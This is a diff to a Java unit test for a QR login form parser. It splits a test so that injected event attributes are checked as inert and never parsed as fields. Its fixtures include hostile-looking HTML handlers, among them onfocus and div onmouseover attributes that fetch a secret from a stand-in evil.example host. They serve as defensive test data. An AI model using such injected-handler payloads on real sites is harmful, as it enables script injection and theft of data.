@@ -227,16 +227,25 @@ public class NgaQrLoginFormTest {
         }
     }
 
-    @Test public void requiresExactKnownConfirmationHandlerAndRejectsOtherEventAttributes() {
+    @Test public void requiresExactKnownConfirmationHandler() {
         assertEquals(KEY, parse(form(KEY_INPUT + SUBMIT.replace("loginSubmit(this)", "loginSubmit(this);"))).fields.get("qrkey"));
         for (String handler : new String[]{"", "confirm()", "loginSubmit(this);evil()", "evil();loginSubmit(this)", "loginSubmit()"})
             reject(form(KEY_INPUT + SUBMIT.replace("loginSubmit(this)", handler)));
         reject(form(KEY_INPUT + SUBMIT.replace(" onclick='loginSubmit(this)'", "")));
-        for (String attribute : new String[]{"onsubmit='evil()'", "onload='evil()'", "onmouseover='evil()'"}) {
-            reject(form(KEY_INPUT + SUBMIT).replace("method='post'", "method='post' " + attribute));
-            reject(form(KEY_INPUT.replace("type='hidden'", "type='hidden' " + attribute) + SUBMIT));
-            reject(form(KEY_INPUT + SUBMIT.replace("id='loginsubmit'", "id='loginsubmit' " + attribute)));
+    }
+
+    @Test public void nonessentialEventsAreInertAndNeverBecomeFields() {
+        Map<String, String> expected = parse(form(KEY_INPUT + hidden("_csrf", "SyntheticToken") + SUBMIT)).fields;
+        for (String attribute : new String[]{"onsubmit='return false'", "onload='HandlerSecret'",
+                "onfocus='fetch(&quot;https://evil.example/HandlerSecret&quot;)'", "onmouseover='arbitrary()'"}) {
+            String valid = form(KEY_INPUT + hidden("_csrf", "SyntheticToken") + SUBMIT);
+            assertEquals(expected, parse(valid.replace("method='post'", "method='post' " + attribute)).fields);
+            assertEquals(expected, parse(valid.replace("type='hidden'", "type='hidden' " + attribute)).fields);
+            assertEquals(expected, parse(valid.replace("id='loginsubmit'", "id='loginsubmit' " + attribute)).fields);
         }
+        String inert = "<img src='https://evil.example/resource' onerror='HandlerSecret'>"
+                + "<div onmouseover='fetch(&quot;https://evil.example/HandlerSecret&quot;)'>Ignored</div>";
+        assertEquals(expected, parse(form(KEY_INPUT + hidden("_csrf", "SyntheticToken") + inert + SUBMIT)).fields);
     }
 
     @Test public void onlyEmptyKnownLoginframeIsSupported() {
